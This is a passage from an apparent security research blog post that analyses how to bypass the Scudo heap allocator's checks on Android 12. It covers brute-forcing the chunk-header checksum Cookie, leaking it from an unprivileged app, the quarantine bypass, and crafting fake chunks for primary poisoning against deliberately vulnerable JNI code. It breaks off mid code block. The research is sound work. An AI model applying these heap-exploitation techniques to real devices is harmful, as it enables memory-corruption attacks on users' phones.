&lt;h2 id="necessary-assumptions">Necessary Assumptions&lt;/h2>
&lt;p>Up to this point, no &amp;ldquo;easy&amp;rdquo; way of bypassing the checks in the implementations of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=298;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>malloc&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513">&lt;code>free&lt;/code>&lt;/a> has been found. Therefore it will be unavoidable to assume that certain events have happened already.&lt;/p>
&lt;p>The key observation is that every &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=65">chunk header&lt;/a> is protected by a checksum, which is verified for every chunk that is passed to &lt;code>free&lt;/code> via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=547;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Chunk::loadHeader(Cookie, Ptr, &amp;amp;Header)&lt;/code>&lt;/a>. The computations performed when calculating the checksum are architecture - dependent. Therefore, we assume an Intel architecture, i.e. the checksum computation is based on the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=31;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>crc32&lt;/code>&lt;/a> instruction.&lt;/p>
&lt;p>The checksum depends on&lt;/p>
&lt;ol>
&lt;li>a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=988">random 32-bit value&lt;/a> named &lt;code>Cookie&lt;/code>&lt;/li>
&lt;li>a pointer to the user data. This pointer is pointing to the memory located right after the chunk header.&lt;/li>
&lt;li>the header of the chunk. The checksum is computed over the header with a zeroed - out checksum field.&lt;/li>
&lt;/ol>
&lt;p>Also, as &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">&lt;em>Zygote&lt;/em> forks itself&lt;/a> when creating a new app, global variables of shared - object files that are already loaded into &lt;em>Zygote&lt;/em> will remain constant until &lt;em>Zygote&lt;/em> is restarted. A list of loaded shared - object files can be seen below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf -d /proc/&lt;span style="color:#66d9ef">$(&lt;/span>pidof zygote64&lt;span style="color:#66d9ef">)&lt;/span>/exe | grep NEEDED
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libandroid_runtime.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libbinder.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libcutils.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libhidlbase.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>liblog.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libnativeloader.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libsigchain.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libutils.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libwilhelm.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libc++.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libc.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libm.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libdl.so&lt;span style="color:#f92672">]&lt;/span>
$ cat /proc/&lt;span style="color:#66d9ef">$(&lt;/span>pidof zygote64&lt;span style="color:#66d9ef">)&lt;/span>/maps | grep libc.so
730eb404b000-730eb408f000 r--p &lt;span style="color:#ae81ff">00000000&lt;/span> 07:60 &lt;span style="color:#ae81ff">21&lt;/span> /apex/com.android.runtime/lib64/bionic/libc.so
730eb408f000-730eb411d000 r-xp &lt;span style="color:#ae81ff">00043000&lt;/span> 07:60 &lt;span style="color:#ae81ff">21&lt;/span> /apex/com.android.runtime/lib64/bionic/libc.so
730eb411d000-730eb4122000 r--p 000d0000 07:60 &lt;span style="color:#ae81ff">21&lt;/span> /apex/com.android.runtime/lib64/bionic/libc.so
730eb4122000-730eb4123000 rw-p 000d4000 07:60 &lt;span style="color:#ae81ff">21&lt;/span> /apex/com.android.runtime/lib64/bionic/libc.so
$ readelf -s /apex/com.android.runtime/lib64/bionic/libc.so | grep -e &lt;span style="color:#e6db74">&amp;#34; scudo_malloc&amp;#34;&lt;/span>
...
199: 000000000004a0f0 &lt;span style="color:#ae81ff">55&lt;/span> FUNC LOCAL DEFAULT &lt;span style="color:#ae81ff">14&lt;/span> scudo_malloc
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus, &lt;em>Scudo&lt;/em> is implemented in &lt;em>libc.so&lt;/em>. Therefore it can be expected that the global variable &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=23;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1">&lt;code>SCUDO_ALLOCATOR&lt;/code>&lt;/a>, which is used to implement &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57">&lt;code>scudo_malloc&lt;/code>&lt;/a> and so on, is the same across all apps forked from &lt;em>Zygote&lt;/em>. &lt;code>SCUDO_ALLOCATOR&lt;/code> is nothing but an &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1">instance&lt;/a> of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=46;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1">&lt;code>scudo::Allocator&lt;/code>&lt;/a>, which contains the field named &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=988;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1">&lt;code>Cookie&lt;/code>&lt;/a>. Hence, the &lt;code>Allocator::Cookie&lt;/code> field can be expected to be the same across all apps forked from &lt;em>Zygote&lt;/em>.&lt;/p>
&lt;p>So we need to get the cookie once (per system restart) and we will be able to exploit &lt;em>Scudo&lt;/em>/Heap - related vulnerabilities as long as we know necessary pointers. Unless stated otherwise, in the following sections we will &lt;strong>always&lt;/strong> assume that we are given sufficient leaks to compute correct checksums!&lt;/p>
&lt;h3 id="classical-information-leak">Classical Information Leak&lt;/h3>
&lt;p>Attacks on checksum computation are already out there, e.g. it &lt;strong>has been&lt;/strong> possible to compute the &lt;code>Cookie&lt;/code> from a pointer and header leak (the header contains a valid checksum!) by reformulating the checksum computation as a set of &lt;a href="https://blog.infosectcbr.com.au/2020/04/breaking-secure-checksums-in-scudo_8.html">SMT equations&lt;/a>. Unfortunately, comparing the implementation attacked with the implementation we are facing, we can observe that&lt;/p>
&lt;ol>
&lt;li>Intel uses a custom generator polynomial to implement &lt;code>crc32&lt;/code> (see Intel Manual Vol. 2). I.e. &lt;code>poly = 0x11EDC6F41&lt;/code> instead of the standardized &lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;ved=2ahUKEwjv-b6ek577AhUfgP0HHTfXDqYQFnoECA0QAQ&amp;amp;url=https%3A%2F%2Fwww.xilinx.com%2Fsupport%2Fdocumentation%2Fapplication_notes%2Fxapp209.pdf&amp;amp;usg=AOvVaw14GnRtGjY_V6hR_uKgWz03">&lt;code>0x0104C11DB7&lt;/code>&lt;/a>.&lt;/li>
&lt;li>Checksum computation in our cases applies an &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=32;drc=b45a2ea782074944f79fc388df20b06e01f265f7">additional xor&lt;/a> in order to reduce the checksum size.&lt;/li>
&lt;/ol>
&lt;p>It has not been possible to derive a lookup table for Intel&amp;rsquo;s crc32 implementation. If it had been successful, maybe the SMT attack would have worked. Other attacks involving symbolic execution (via &lt;a href="http://klee.github.io/">klee&lt;/a> based on &lt;a href="https://sat-smt.codes/SAT_SMT_by_example.pdf">this&lt;/a> have also not been successful&amp;hellip;). Still, there is another approach to go back to: &lt;strong>brute - force&lt;/strong>!&lt;/p>
&lt;p>Turns out that using a multi - threaded application to brute - force the &lt;code>Cookie&lt;/code> overshot the goal. E.g., if we are given:&lt;/p>
&lt;ol>
&lt;li>&lt;code>pointer = 0x7bac6974fd30&lt;/code>&lt;/li>
&lt;li>&lt;code>header = 0x20d2000000010101&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>brute - forcing the &lt;code>Cookie&lt;/code> s.t. &lt;code>computeChecksum(Cookie, pointer, zeroed_header) == checksum(header)&lt;/code> is true resulted in roughly 120155 candidates over the course of 3 seconds&amp;hellip; running it for longer of course will yield more results:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ head cookies.txt
0x2a7e
0x2000539a
0x6000a052
0x4000d9b6
0x80009213
0xc00061db
0x20014924
0xe000183f
0x130c0
0xa000ebf7
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now one might argue that those cookie values are only valid for the above configuration. The funny thing is that at least some of them &lt;strong>work for different configurations as well&lt;/strong>! This means that the pointer used to brute - force the cookie can be completely different from the pointer of our buffer! Of course neither every single value has been verified, nor is there a formal proof to why most of the above cookies work. Empirically speaking, e.g. &lt;code>0x2a7e&lt;/code> worked for crafting fake chunks etc. therefore bypassing the checksum verifications!&lt;/p>
&lt;h3 id="unprivileged-app">Unprivileged App&lt;/h3>
&lt;p>Due to the appification, one might argue that it nowadays is easier to execute an app on a targeted mobile device (assuming your average smartphone user) than it has been 10 years ago. Therefore, research regarding &lt;em>side channel attacks on mobile devices&lt;/em> (e.g. see &amp;ldquo;An Insight into Android Side-Channel Attacks&amp;rdquo; for a rough overview on this topic) often assume that there is an unprivileged app already running on the targeted device.&lt;/p>
&lt;p>Hence we could also assume that we can at least start an app on the target device. Notice that permissions for &lt;a href="https://developer.android.com/reference/android/Manifest.permission#INTERNET">communication over the internet&lt;/a> are &lt;a href="https://developer.android.com/guide/topics/permissions/overview#normal">normal permissions&lt;/a>, i.e. they are specified in the android manifest file of an app and the user is only asked once per installation whether the permissions are fine or not. Therefore we may also assume that an app has almost arbitrary install - time permissions and can leak information via networking.&lt;/p>
&lt;p>Adding to the pile, on Android every app is &lt;a href="#necessary-assumptions">forked from a process named &lt;code>Zygote64&lt;/code>&lt;/a>. Convince yourself that &lt;code>libc.so&lt;/code>&lt;/p>
&lt;ol>
&lt;li>contains &lt;em>Scudo&lt;/em>&lt;/li>
&lt;li>is loaded by &lt;code>Zygote64&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>Finally, there is only &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">one instance of the allocator&lt;/a>.&lt;/p>
&lt;p>Concluding, every app not only has access to the canary used in every app, but also to the &lt;code>Cookie&lt;/code> used in &lt;strong>every app&lt;/strong>. Thus, an unprivileged app can easily leak the cookie, therefore leaving us with &lt;em>almost&lt;/em> the same setting as the &lt;a href="#classical-information-leak">information leak&lt;/a>. The only difference is that we do not have a pointer, which we need to compute the checksum.&lt;/p>
&lt;h3 id="suitable-jni-code">Suitable JNI Code&lt;/h3>
&lt;p>As always, we will consider small example modules for &lt;em>damnvulnerableapp&lt;/em>. These will not represent real - world applications, but rather contain obviously vulnerable code like &lt;code>free(attacker_controlled_buffer + 0x10)&lt;/code>.&lt;/p>
&lt;h2 id="attack-scenarios-on-scudo---related-vulnerabilities">Attack Scenarios on &lt;em>Scudo&lt;/em> - related Vulnerabilities&lt;/h2>
&lt;p>From this point onwards, we will try to derive attacks that are applicable to bugs that involve calls to &lt;em>Scudo&lt;/em> - related functions like &lt;code>free&lt;/code>. These attacks will be of the form &lt;em>Proof of Concept&lt;/em>, i.e. e.g. we will already be satisfied, if construction of fake chunks works, instead of achieving arbitrary code execution. The idea here is to get to a comparable point wrt. other heap implementations like &lt;a href="https://www.gnu.org/software/libc/manual/html_node/The-GNU-Allocator.html">&lt;em>dlmalloc&lt;/em>&lt;/a>.&lt;/p>
&lt;h3 id="freeing-chunks-that-are-not-really-chunks">Freeing Chunks that are not really Chunks&lt;/h3>
&lt;p>For this section and following subsections we will assume that the target app contains JNI code similar to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buffer &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
...
free(buffer &lt;span style="color:#f92672">+&lt;/span> x); &lt;span style="color:#75715e">// x = 0x10(primary) or 0x40(secondary)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Disregarding the fact that no programmer would ever call &lt;code>free&lt;/code> like this, there are always settings where the attention of a developer slips and comparable bugs occur. Also we could reinterpret this as calling &lt;code>free&lt;/code> on an attacker - controlled pointer.&lt;/p>
&lt;p>When calling &lt;code>free&lt;/code>, internally &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35">&lt;code>scudo_free&lt;/code>&lt;/a> is executed, which will wind up to call &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513">&lt;code>deallocate&lt;/code>&lt;/a>. There are a few checks we need to pass in order to get to the storage parts of chunks of the allocator:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">...
&lt;span style="color:#75715e">// [1] Check alignment of pointer provided to deallocate
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(&lt;span style="color:#f92672">!&lt;/span>isAligned(&lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Ptr), MinAlignment)))
reportMisalignedPointer(AllocatorAction&lt;span style="color:#f92672">::&lt;/span>Deallocating, Ptr);
...
&lt;span style="color:#75715e">// [2] Check the checksum of the header. If it is corrupted, the process will be aborted!
&lt;/span>&lt;span style="color:#75715e">&lt;/span>Chunk&lt;span style="color:#f92672">::&lt;/span>loadHeader(Cookie, Ptr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>Header);
&lt;span style="color:#75715e">// [3] Verify that the chunk is not double - freed
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(Header.State &lt;span style="color:#f92672">!=&lt;/span> Chunk&lt;span style="color:#f92672">::&lt;/span>State&lt;span style="color:#f92672">::&lt;/span>Allocated))
reportInvalidChunkState(AllocatorAction&lt;span style="color:#f92672">::&lt;/span>Deallocating, Ptr);
...
&lt;span style="color:#75715e">// [4] Check that e.g. free is used for malloc&amp;#39;ed memory.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (Options.get(OptionBit&lt;span style="color:#f92672">::&lt;/span>DeallocTypeMismatch)) {
&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(Header.OriginOrWasZeroed &lt;span style="color:#f92672">!=&lt;/span> Origin)) {
&lt;span style="color:#66d9ef">if&lt;/span> (Header.OriginOrWasZeroed &lt;span style="color:#f92672">!=&lt;/span> Chunk&lt;span style="color:#f92672">::&lt;/span>Origin&lt;span style="color:#f92672">::&lt;/span>Memalign &lt;span style="color:#f92672">||&lt;/span>
Origin &lt;span style="color:#f92672">!=&lt;/span> Chunk&lt;span style="color:#f92672">::&lt;/span>Origin&lt;span style="color:#f92672">::&lt;/span>Malloc)
reportDeallocTypeMismatch(AllocatorAction&lt;span style="color:#f92672">::&lt;/span>Deallocating, Ptr,
Header.OriginOrWasZeroed, Origin);
}
}
...
&lt;span style="color:#75715e">// [5] Check the size of the chunk
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> uptr Size &lt;span style="color:#f92672">=&lt;/span> getSize(Ptr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>Header);
&lt;span style="color:#66d9ef">if&lt;/span> (DeleteSize &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Options.get(OptionBit&lt;span style="color:#f92672">::&lt;/span>DeleteSizeMismatch)) {
&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(DeleteSize &lt;span style="color:#f92672">!=&lt;/span> Size))
reportDeleteSizeMismatch(Ptr, DeleteSize, Size);
}
&lt;span style="color:#75715e">// [6] This does the actual freeing
&lt;/span>&lt;span style="color:#75715e">&lt;/span>quarantineOrDeallocateChunk(Options, TaggedPtr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>Header, Size);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=36">call to &lt;code>deallocate&lt;/code> in &lt;code>scudo_malloc&lt;/code>&lt;/a> and the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=513;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">function signature of &lt;code>deallocate&lt;/code>&lt;/a>, we can infer that &lt;em>[5]&lt;/em> is not relevant:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">INTERFACE WEAK &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">SCUDO_PREFIX&lt;/span>(free)(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr) {
SCUDO_ALLOCATOR.deallocate(ptr, scudo&lt;span style="color:#f92672">::&lt;/span>Chunk&lt;span style="color:#f92672">::&lt;/span>Origin&lt;span style="color:#f92672">::&lt;/span>Malloc);
}
NOINLINE &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">deallocate&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Ptr, Chunk&lt;span style="color:#f92672">::&lt;/span>Origin Origin, uptr DeleteSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,
UNUSED uptr Alignment &lt;span style="color:#f92672">=&lt;/span> MinAlignment) {...}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>as &lt;code>DeleteSize&lt;/code> defaults to &lt;code>0&lt;/code>! Therefore, as long as &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078">&lt;code>quarantineOrDeallocateChunk&lt;/code>&lt;/a> does not apply any more checks on the size, the size can be choosen arbitrarily, i.e. to our advantage.&lt;/p>
&lt;p>In &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=1078">&lt;code>quarantineOrDeallocateChunk&lt;/code>&lt;/a>, there is a check that determines whether a chunk will be put into quarantine, i.e. its freeing will be hold back to avoid reuse - based attacks. The flag that represents this &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1085;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">check&lt;/a> is computed as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">...
&lt;span style="color:#75715e">// If the quarantine is disabled, the actual size of a chunk is 0 or larger
&lt;/span>&lt;span style="color:#75715e">// than the maximum allowed, we return a chunk directly to the backend.
&lt;/span>&lt;span style="color:#75715e">// This purposefully underflows for Size == 0.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> BypassQuarantine &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>Quarantine.getCacheSize() &lt;span style="color:#f92672">||&lt;/span>
((Size &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> QuarantineMaxChunkSize) &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">!&lt;/span>NewHeader.ClassId;
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that the comment states that &amp;ldquo;This purposefully underflows for Size == 0&amp;rdquo;, making &lt;code>BypassQuarantine = true&lt;/code> for &lt;code>Size = 0&lt;/code> :) Therefore, even if the quarantine was activated by default (which it is not! Notice that &lt;code>Quarantine.getCacheSize() = thread_local_quarantine_size_kb &amp;lt;&amp;lt; 10&lt;/code>, where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=18;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>thread_local_quarantine_size_kb = 0&lt;/code>&lt;/a>), we could bypass the quarantine by &lt;code>size = 0&lt;/code>.&lt;/p>
&lt;p>There are a few more interesting checks for the chunk (in the bypass branch):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>BlockBegin &lt;span style="color:#f92672">=&lt;/span> getBlockBegin(Ptr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>NewHeader);
&lt;span style="color:#66d9ef">const&lt;/span> uptr ClassId &lt;span style="color:#f92672">=&lt;/span> NewHeader.ClassId;
&lt;span style="color:#66d9ef">if&lt;/span> (LIKELY(ClassId)) {
...
TSD&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Cache.deallocate(ClassId, BlockBegin);
...
} &lt;span style="color:#66d9ef">else&lt;/span> {
...
Secondary.deallocate(Options, BlockBegin);
}
...
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>getBlockBegin(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Ptr,
Chunk&lt;span style="color:#f92672">::&lt;/span>UnpackedHeader &lt;span style="color:#f92672">*&lt;/span>Header) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(
&lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Ptr) &lt;span style="color:#f92672">-&lt;/span> Chunk&lt;span style="color:#f92672">::&lt;/span>getHeaderSize() &lt;span style="color:#f92672">-&lt;/span>
(&lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Header&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Offset) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> MinAlignmentLog));
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Observe that we control &lt;code>NewHeader.ClassId&lt;/code> and &lt;code>Header-&amp;gt;Offset&lt;/code> (maybe &lt;code>Header-&amp;gt;Offset&lt;/code> can be used for &lt;a href="#future-work">memory probing&lt;/a>).&lt;/p>
&lt;p>From this point onwards, we can distinguish attacks that use the primary or the secondary!&lt;/p>
&lt;h4 id="primary-poisoning">Primary Poisoning&lt;/h4>
&lt;p>If we want to get to &lt;code>Cache.deallocate&lt;/code>, we will need &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>NewHeader.ClassId &amp;gt; 0&lt;/code>&lt;/a> to pass the check.&lt;/p>
&lt;p>Investigating &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=84">&lt;code>Cache.deallocate&lt;/code>&lt;/a>, which is the primary, reveals:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">deallocate&lt;/span>(uptr ClassId, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>P) {
CHECK_LT(ClassId, NumClasses);
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
...
C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span>
Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>compactPtr(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(P));
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus, if we get through all the checks, when &lt;code>Cache.deallocate&lt;/code> is called, our fake chunk will be part of the list! One way to verify this is to create a JNI function of the form:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#define BUFFER_SIZE 0x20
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
